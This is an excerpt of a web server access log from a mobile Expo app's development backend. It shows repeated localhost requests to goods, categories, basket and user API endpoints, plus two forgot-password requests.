::ffff:127.0.0.1 - - [23/Sep/2022:07:11:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:12:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:12:15 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:12:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:12:16 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:12:16 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:12:16 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:13:40 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:13:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:13:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:13:41 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:13:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:13:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:13:55 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:13:56 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:13:56 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:13:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:14:01 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:14:01 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:14:01 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:14:03 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:14:26 +0000] "POST /api/v1/users/forgot-password HTTP/1.0" 200 16 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:14:33 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 200 339 "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:24 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:24 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:15:25 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:15:26 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:15:26 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:15:40 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:15:40 +0000] "GET /api/v1/users/632c16cb88be787a3eb808cf HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:40 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::1 - - [23/Sep/2022:07:15:40 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
::ffff:127.0.0.1 - - [23/Sep/2022:07:15:59 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "Expo/2.25.3.1015682 CFNetwork/1390 Darwin/22.0.0"
